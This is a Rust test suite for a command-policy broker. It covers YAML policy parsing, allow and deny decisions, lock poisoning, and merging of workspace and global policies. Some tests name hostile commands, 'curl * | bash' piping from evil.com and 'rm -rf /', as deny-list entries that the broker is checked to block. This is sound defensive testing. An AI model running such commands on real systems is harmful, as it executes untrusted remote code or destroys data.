use super::*;
use std::sync::{Arc, Barrier, RwLock};
use substrate_common::WorldFsMode;
use tempfile::tempdir;

fn poison_rwlock<T: Send + Sync + 'static>(lock: &Arc<RwLock<T>>) {
    let cloned = Arc::clone(lock);
    let _ = std::thread::spawn(move || {
        let _guard = cloned.write().unwrap();
        panic!("poison lock");
    })
    .join();
}

#[test]
fn test_broker_creation() {
    let broker = Broker::new();
    assert!(broker.is_observe_only());
}

#[test]
fn test_pattern_matching() {
    assert!(matches_pattern(
        "curl http://example.com | bash",
        "curl * | bash"
    ));
    assert!(matches_pattern("npm install", "npm install"));
    assert!(!matches_pattern("cargo build", "npm install"));
    assert!(matches_pattern("git clone repo", "git clone"));
}

#[test]
fn test_quick_check_allow() {
    let broker = Broker::new();
    let result = broker
        .quick_check(&["echo".into(), "hello".into()], "/tmp")
        .unwrap();
    assert!(matches!(result, Decision::Allow));
}

#[test]
fn test_load_policy() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    let broker = Broker::new();

    let policy_content = r#"
id: test-policy
name: Test Policy
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist:
    - /tmp/*
  write_allowlist:
    - /tmp/*
net_allowed:
  - github.com
cmd_allowed:
  - echo *
  - ls *
cmd_denied:
  - rm -rf /
  - curl * | bash
cmd_isolated:
  - npm install
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#;
    std::fs::write(&policy_path, policy_content).unwrap();

    broker.load_policy(&policy_path).expect("load policy");

    let policy = broker.policy.read().unwrap();
    assert_eq!(policy.world_fs_mode, WorldFsMode::Writable);

    // Test that denied command is blocked (in enforce mode)
    broker.set_observe_only(false);
    let result = broker
        .quick_check(
            &["curl".into(), "evil.com".into(), "|".into(), "bash".into()],
            "/tmp",
        )
        .unwrap();
    assert!(matches!(result, Decision::Deny(_)));
}

#[test]
fn minimal_policy_parses_with_required_world_fs() {
    let raw = r#"
id: minimal
name: Minimal Profile
world_fs:
  mode: read_only
  isolation: workspace
  require_world: true
  read_allowlist: ["*"]
  write_allowlist: []
net_allowed: []
cmd_allowed: []
cmd_denied: ["ls"]
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#;

    let policy: Policy = serde_yaml::from_str(raw).expect("policy should parse");
    assert_eq!(policy.id, "minimal");
    assert_eq!(policy.world_fs_mode, WorldFsMode::ReadOnly);
    assert_eq!(policy.fs_read, vec!["*".to_string()]);
    assert!(policy.fs_write.is_empty());
    assert!(policy.net_allowed.is_empty());
    assert!(policy.cmd_allowed.is_empty());
}

#[test]
fn poisoned_policy_lock_returns_error_in_evaluate() {
    let broker = Broker::new();
    poison_rwlock(&broker.policy);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo ok", "/tmp", None));
    assert!(result.is_ok(), "broker.evaluate panicked on poisoned lock");

    let err = result
        .unwrap()
        .expect_err("expected poisoned lock to return error");
    assert!(
        err.to_string()
            .contains("Failed to acquire policy read lock"),
        "unexpected error: {err}"
    );

    broker.policy.clear_poison();
}

#[test]
fn poisoned_approvals_lock_returns_error() {
    let broker = Broker::new();
    {
        let mut policy = broker.policy.write().unwrap();
        policy.require_approval = true;
    }
    broker.set_observe_only(false);
    poison_rwlock(&broker.approvals);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo guarded", "/tmp", None));
    assert!(
        result.is_ok(),
        "broker.evaluate panicked with poisoned approvals"
    );

    let err = result
        .unwrap()
        .expect_err("expected approval read failure to return error");
    assert!(
        err.to_string().contains("approvals read lock"),
        "unexpected error: {err}"
    );

    broker.approvals.clear_poison();
}

#[test]
fn broker_handles_remain_isolated_in_parallel() {
    let dir = tempdir().unwrap();
    let policy_a = dir.path().join("policy_a.yaml");
    let policy_b = dir.path().join("policy_b.yaml");

    std::fs::write(
        &policy_a,
        r#"
id: alpha
name: Alpha Policy
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
net_allowed: []
cmd_allowed:
  - alpha-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    std::fs::write(
        &policy_b,
        r#"
id: beta
name: Beta Policy
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
net_allowed: []
cmd_allowed:
  - beta-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    let broker_a = BrokerHandle::new();
    broker_a.initialize(Some(&policy_a)).unwrap();
    broker_a.set_observe_only(false);

    let broker_b = BrokerHandle::new();
    broker_b.initialize(Some(&policy_b)).unwrap();

    assert!(
        broker_b.is_observe_only(),
        "changing one broker handle should not affect another"
    );
    broker_b.set_observe_only(false);

    let barrier = Arc::new(Barrier::new(2));
    let thread_a = {
        let barrier = barrier.clone();
        let broker = broker_a.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("alpha-allowed", "/tmp", None)
        })
    };

    let thread_b = {
        let barrier = barrier.clone();
        let broker = broker_b.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("beta-allowed", "/tmp", None)
        })
    };

    let decision_a = thread_a.join().expect("thread a panicked").unwrap();
    let decision_b = thread_b.join().expect("thread b panicked").unwrap();

    assert!(matches!(decision_a, Decision::Allow));
    assert!(matches!(decision_b, Decision::Allow));

    assert!(matches!(
        broker_a
            .evaluate("beta-allowed", "/tmp", None)
            .expect("evaluate beta on broker_a"),
        Decision::Deny(_)
    ));
    assert!(matches!(
        broker_b
            .evaluate("alpha-allowed", "/tmp", None)
            .expect("evaluate alpha on broker_b"),
        Decision::Deny(_)
    ));
}

#[test]
fn invalid_world_fs_mode_in_policy_surfaces_error() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
id: bad-fs-mode
name: Invalid fs mode
world_fs:
  mode: invalid
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
net_allowed: []
cmd_allowed: []
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    let broker = Broker::new();
    let result = broker.load_policy(&policy_path);
    assert!(
        result.is_err(),
        "expected invalid world_fs.mode to fail parsing"
    );
}

mod i0_strict_policy_schema_world_fs {
    use super::*;

    const BASE_POLICY_YAML: &str = r#"
id: p
name: Policy
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
net_allowed: []
cmd_allowed: []
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#;

    fn parse_err(raw: &str) -> String {
        serde_yaml::from_str::<Policy>(raw)
            .expect_err("expected policy parse error")
            .to_string()
    }

    #[test]
    fn missing_world_fs_fails_with_actionable_error() {
        let err = parse_err(
            r#"
id: p
name: Policy
"#,
        );

        assert!(
            err.contains("missing field `world_fs`"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn invalid_world_fs_mode_fails_with_allowed_values() {
        let err = parse_err(&BASE_POLICY_YAML.replace("mode: writable", "mode: invalid"));
        assert!(
            err.contains("invalid world_fs.mode"),
            "unexpected error: {err}"
        );
        assert!(err.contains("writable"), "unexpected error: {err}");
        assert!(err.contains("read_only"), "unexpected error: {err}");
    }

    #[test]
    fn invalid_world_fs_isolation_fails_with_allowed_values() {
        let err =
            parse_err(&BASE_POLICY_YAML.replace("isolation: workspace", "isolation: invalid"));
        assert!(
            err.contains("invalid world_fs.isolation"),
            "unexpected error: {err}"
        );
        assert!(err.contains("workspace"), "unexpected error: {err}");
        assert!(err.contains("full"), "unexpected error: {err}");
    }

    #[test]
    fn read_only_requires_require_world_true() {
        let err = parse_err(&BASE_POLICY_YAML.replace("mode: writable", "mode: read_only"));
        assert!(
            err.contains("mode=read_only") && err.contains("require_world=true"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn full_isolation_requires_require_world_true() {
        let err = parse_err(&BASE_POLICY_YAML.replace("isolation: workspace", "isolation: full"));
        assert!(
            err.contains("isolation=full") && err.contains("require_world=true"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn write_allowlist_can_be_empty_but_required() {
        serde_yaml::from_str::<Policy>(BASE_POLICY_YAML).expect("empty write_allowlist allowed");

        let raw_missing_write_allowlist = r#"
id: p
name: Policy
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
net_allowed: []
cmd_allowed: []
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#;

        let err = parse_err(raw_missing_write_allowlist);
        assert!(
            err.contains("missing field `write_allowlist`"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn legacy_keys_are_rejected() {
        let err = parse_err(
            &BASE_POLICY_YAML.replace("name: Policy", "name: Policy\nworld_fs_mode: writable"),
        );
        assert!(
            err.contains("unknown field") && err.contains("world_fs_mode"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn minimal_world_fs_policy_passes() {
        let policy: Policy =
            serde_yaml::from_str(&BASE_POLICY_YAML.replace("[\"*\"]", "[\"./*\"]"))
                .expect("minimal world_fs policy should parse");
        assert_eq!(policy.world_fs_mode, WorldFsMode::Writable);
        assert_eq!(policy.world_fs_isolation, WorldFsIsolation::Workspace);
        assert!(!policy.world_fs_require_world);
    }

    #[test]
    fn legacy_isolation_project_is_accepted() {
        let policy: Policy = serde_yaml::from_str(
            &BASE_POLICY_YAML.replace("isolation: workspace", "isolation: project"),
        )
        .expect("legacy isolation=project should still parse");
        assert_eq!(policy.world_fs_isolation, WorldFsIsolation::Workspace);
    }
}

mod c0_policy_patch_only_broker_effective_resolution {
    use serial_test::serial;
    use std::ffi::OsString;
    use std::path::{Path, PathBuf};
    use std::process::Command;
    use std::sync::OnceLock;
    use tempfile::{Builder, TempDir};

    struct EnvVarGuard {
        key: &'static str,
        prev: Option<OsString>,
    }

    impl EnvVarGuard {
        fn set(key: &'static str, value: impl AsRef<Path>) -> Self {
            let prev = std::env::var_os(key);
            std::env::set_var(key, value.as_ref());
            Self { key, prev }
        }
    }

    impl Drop for EnvVarGuard {
        fn drop(&mut self) {
            match &self.prev {
                Some(prev) => std::env::set_var(self.key, prev),
                None => std::env::remove_var(self.key),
            }
        }
    }

    fn ensure_substrate_built() {
        static BUILD_ONCE: OnceLock<()> = OnceLock::new();
        BUILD_ONCE.get_or_init(|| {
            let status = Command::new("cargo")
                .args(["build", "-p", "substrate"])
                .status()
                .expect("failed to invoke cargo build -p substrate");
            assert!(status.success(), "cargo build -p substrate failed");
        });
    }

    fn substrate_binary_path() -> PathBuf {
        let binary_name = if cfg!(windows) {
            "substrate.exe"
        } else {
            "substrate"
        };

        if let Ok(workspace_dir) = std::env::var("CARGO_WORKSPACE_DIR") {
            PathBuf::from(workspace_dir)
                .join("target")
                .join("debug")
                .join(binary_name)
        } else {
            PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../../target/debug")
                .join(binary_name)
        }
    }

    fn substrate_cmd(tmpdir: &Path) -> Command {
        ensure_substrate_built();

        let mut cmd = Command::new(substrate_binary_path());
        cmd.env("TMPDIR", tmpdir);
        cmd.env_remove("SHIM_ORIGINAL_PATH");
        cmd.env_remove("SUBSTRATE_WORLD");
        cmd.env_remove("SUBSTRATE_WORLD_ENABLED");
        cmd.env("SUBSTRATE_OVERRIDE_WORLD", "disabled");
        cmd.env_remove("SUBSTRATE_WORLD_ID");
        cmd
    }

    fn temp_dir(prefix: &str) -> TempDir {
        let base = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../target/tests-tmp");
        std::fs::create_dir_all(&base).expect("failed to create shared TMPDIR");
        Builder::new()
            .prefix(prefix)
            .tempdir_in(base)
            .expect("failed to allocate integration test temp dir")
    }

    struct Fixture {
        _temp: TempDir,
        home: PathBuf,
        substrate_home: PathBuf,
        workspace_root: PathBuf,
    }

    impl Fixture {
        fn new() -> Self {
            let temp = temp_dir("c0-policy-patch-only-");
            let home = temp.path().join("home");
            std::fs::create_dir_all(&home).expect("create HOME fixture");
            let substrate_home = temp.path().join("substrate-home");
            std::fs::create_dir_all(&substrate_home).expect("create SUBSTRATE_HOME fixture");
            let workspace_root = temp.path().join("workspace");
            std::fs::create_dir_all(&workspace_root).expect("create workspace root");

            std::fs::create_dir_all(workspace_root.join(".substrate"))
                .expect("create .substrate dir");

            Self {
                _temp: temp,
                home,
                substrate_home,
                workspace_root,
            }
        }

        fn workspace_marker_path(&self) -> PathBuf {
            self.workspace_root
                .join(".substrate")
                .join("workspace.yaml")
        }

        fn workspace_disabled_marker_path(&self) -> PathBuf {
            self.workspace_root
                .join(".substrate")
                .join("workspace.disabled")
        }

        fn workspace_policy_path(&self) -> PathBuf {
            self.workspace_root.join(".substrate").join("policy.yaml")
        }

        fn global_policy_path(&self) -> PathBuf {
            self.substrate_home.join("policy.yaml")
        }

        fn child_dir(&self) -> PathBuf {
            let child = self.workspace_root.join("a/b");
            std::fs::create_dir_all(&child).expect("create child dir");
            child
        }

        fn write_workspace_marker(&self) {
            std::fs::write(self.workspace_marker_path(), "schema_version: 1\n")
                .expect("write workspace.yaml marker");
        }

        fn write_workspace_disabled(&self) {
            std::fs::write(self.workspace_disabled_marker_path(), "")
                .expect("write workspace.disabled marker");
        }

        fn write_global_policy(&self, yaml: &str) {
            std::fs::write(self.global_policy_path(), yaml).expect("write global policy.yaml");
        }

        fn write_workspace_policy(&self, yaml: &str) {
            std::fs::write(self.workspace_policy_path(), yaml)
                .expect("write workspace policy.yaml");
        }

        fn run_substrate(&self, cwd: &Path, args: &[&str]) -> std::process::Output {
            let mut cmd = substrate_cmd(self._temp.path());
            cmd.current_dir(cwd);
            cmd.env("HOME", &self.home);
            cmd.env("USERPROFILE", &self.home);
            cmd.env("SUBSTRATE_HOME", &self.substrate_home);
            cmd.args(args);
            cmd.output().expect("run substrate command")
        }
    }

    fn full_policy_yaml_with_cmd_allowed(policy_id: &str, cmd_allowed: &[&str]) -> String {
        let cmd_allowed_yaml = cmd_allowed
            .iter()
            .map(|s| format!("  - {s}\n"))
            .collect::<String>();
        format!(
            r#"id: "{policy_id}"
name: "{policy_id}"
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
net_allowed: []
cmd_allowed:
{cmd_allowed_yaml}cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {{}}
"#
        )
    }

    #[test]
    #[serial]
    fn c0_cli_policy_current_show_explain_emits_single_json_object_on_stderr() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        let cwd = fixture.child_dir();
        let output =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            output.status.success(),
            "expected `substrate policy current show --explain` to succeed: {output:?}"
        );

        let stderr = String::from_utf8_lossy(&output.stderr);
        let explain: serde_json::Value =
            serde_json::from_slice(&output.stderr).unwrap_or_else(|err| {
                panic!(
                    "expected stderr to be a single JSON object (no extra note lines); parse error: {err}; stderr was: {stderr}"
                )
            });
        assert_eq!(
            explain.get("kind").and_then(|v| v.as_str()),
            Some("substrate.policy.explain.v1"),
            "unexpected explain kind: {explain}"
        );
    }

    #[test]
    #[serial]
    fn c0_broker_merges_sparse_global_and_workspace_patches() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
cmd_allowed:
  - global-allowed
"#,
        );
        fixture.write_workspace_policy(
            r#"
metadata:
  workspace: "true"
"#,
        );

        let cwd = fixture.child_dir();
        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve effective policy via patch merge");

        assert_eq!(policy.cmd_allowed, vec!["global-allowed".to_string()]);
        assert_eq!(
            policy.metadata.get("workspace").map(String::as_str),
            Some("true")
        );
    }

    #[test]
    #[serial]
    fn c0_broker_workspace_disabled_ignores_workspace_patch() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        fixture.write_workspace_disabled();

        fixture.write_global_policy(&full_policy_yaml_with_cmd_allowed(
            "global",
            &["global-allowed"],
        ));
        fixture.write_workspace_policy(&full_policy_yaml_with_cmd_allowed(
            "workspace",
            &["workspace-allowed"],
        ));

        let cwd = fixture.child_dir();
        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve policy for cwd");

        assert_eq!(
            policy.cmd_allowed,
            vec!["global-allowed".to_string()],
            "workspace.disabled should prevent workspace policy from affecting broker effective policy"
        );
    }

    #[test]
    #[serial]
    fn c0_effective_policy_is_identical_across_broker_and_cli_show_and_explain() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
cmd_allowed:
  - global-allowed
"#,
        );
        fixture.write_workspace_policy(
            r#"
metadata:
  workspace: "true"
"#,
        );

        let cwd = fixture.child_dir();

        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (broker_policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve effective policy via patch merge");
        let broker_json = serde_json::to_value(&broker_policy).expect("serialize broker policy");

        let show = fixture.run_substrate(&cwd, &["policy", "current", "show", "--json"]);
        assert!(
            show.status.success(),
            "expected `substrate policy current show` to succeed: {show:?}"
        );
        assert!(
            String::from_utf8_lossy(&show.stderr).contains("effective merged policy"),
            "expected merged-policy note on stderr, got: {}",
            String::from_utf8_lossy(&show.stderr)
        );
        let cli_show_json: serde_json::Value =
            serde_json::from_slice(&show.stdout).expect("policy show should output JSON");

        let explain =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            explain.status.success(),
            "expected `substrate policy current show --explain` to succeed: {explain:?}"
        );
        let cli_explain_json: serde_json::Value = serde_json::from_slice(&explain.stdout)
            .expect("policy show --explain should output JSON");

        assert_eq!(
            cli_show_json, cli_explain_json,
            "stdout policy must match with/without --explain"
        );
        assert_eq!(
            cli_show_json, broker_json,
            "effective policy must match across broker and CLI"
        );
    }
}
